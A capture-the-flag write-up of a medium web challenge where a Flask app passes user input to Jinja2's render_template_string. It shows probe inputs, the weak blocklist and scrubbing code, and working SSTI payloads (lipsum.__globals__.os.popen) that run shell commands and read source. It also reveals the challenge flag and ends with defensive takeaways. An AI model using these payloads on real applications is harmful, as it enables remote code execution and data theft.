## Ghostbusters Template Possession: Writeup

**Category:** Web · **Difficulty:** Medium  
**Flag:** `bitctf{{gh057ly_j1nj4_p0ss35510n}}`

### Summary

A Flask app feeds user input ("a chant") straight into `render_template_string()`: textbook Jinja2 **Server-Side Template Injection (SSTI)**. The intended filtering is cosmetic and trivially bypassed, giving full expression evaluation and remote code execution.

### Recon / Confirmation

The default chant echoed `{{ ecto_status }}` back as `unstable`, proving input is rendered as a template, not printed literally. Two probes confirmed the engine:

- `{{ 7*7 }}` → `49` (evaluation happens)
- `{{ 7*'7' }}` → `7777777` (Python string multiplication ⇒ Jinja2 specifically)

### The Vulnerability

From the leaked `app.py`, user input flows directly into the renderer, guarded only by:

python

```python
BLOCKED_FRAGMENTS = ("config", "self", "request")

def scrub_chant(chant: str) -> str:
    return chant.replace("{%", "").replace("%}", "")
```

Both are weak. `scrub_chant` strips only `{% %}` statement blocks, but Jinja2 SSTI→RCE never needs them; everything works through `{{ }}` expressions. The blocklist covers just three substrings, which is why `config`/`self`/`request` payloads got _"Spectral firewall rejected that fragment"_ while `cycler`, `lipsum`, and `os` passed untouched. None of the blocked words are required.

This maps to the hints: _"only strips ritual control blocks"_ (the `{% %}` stripping) and the expression path left wide open.

### Exploitation

Reach `os` through a non-blocked Jinja global:

jinja

```jinja
{{ lipsum.__globals__.os.popen('ls').read() }}
```

→ `Dockerfile README.md app.py challenge.json exploit.py required_files.txt requirements.txt templates`

`/flag.txt` didn't exist, so read the source directly:

jinja

```jinja
{{ lipsum.__globals__.os.popen('cat app.py').read() }}
```

### The Flag

The flag was never a file: it's an env var with a hardcoded default:

python

```python
FLAG = os.environ.get("FLAG", "bitctf{{gh057ly_j1nj4_p0ss35510n}}")
```

The submitted flag is the literal source string, double braces included:

```
bitctf{{gh057ly_j1nj4_p0ss35510n}}
```

That doubling is exactly what made the format look "inconsistent." `app.py` also exposes `sealed_checksum: len(FLAG)` in the context processor: a length side channel that would confirm the flag even without RCE.

<img width="1199" height="735" alt="image" src="https://github.com/user-attachments/assets/629bb123-edee-4960-86de-2f65b7f04590" />

### Key Takeaways

- Never pass user input to `render_template_string()`; use `render_template` with passed variables or a sandboxed environment.
- Substring blocklists don't fix SSTI: Jinja2 has many interchangeable gadgets (`cycler`, `lipsum`, `joiner`, `namespace`, …), so blocking three names accomplishes nothing.
- Stripping `{% %}` while leaving `{{ }}` is no defense; expression injection alone suffices for RCE.
